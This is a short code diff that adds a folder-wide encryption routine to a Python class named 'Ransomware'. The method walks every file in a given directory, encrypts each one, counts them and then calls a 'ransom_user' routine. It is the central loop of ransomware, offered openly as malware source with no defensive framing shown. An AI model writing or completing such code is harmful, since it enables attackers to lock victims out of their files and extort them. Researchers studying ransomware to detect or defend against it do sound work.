@@ -106,3 +106,23 @@ class Ransomware:
                 files.append(file_path)
             
         return file
+    
+    def encrypt_files_in_folder(self, path):
+        """ Encrypt all files in the given directory specified
+        by path.
+
+        :param str path: Path of the folder to be encrypted.
+        :returns: Number of encrypted files (`int`).
+        """
+
+        num_encrypted_files = 0
+        files = self.get_files_in_folder(path)
+
+        # Encrypting files in folder
+        for file in files:
+            logging.debug("Encrypted file: {}".format(file))
+            self.encrypt_file(file)
+            num_encrypted_files+=1
+        
+        self.ransom_user()
+        return num_encrypted_files
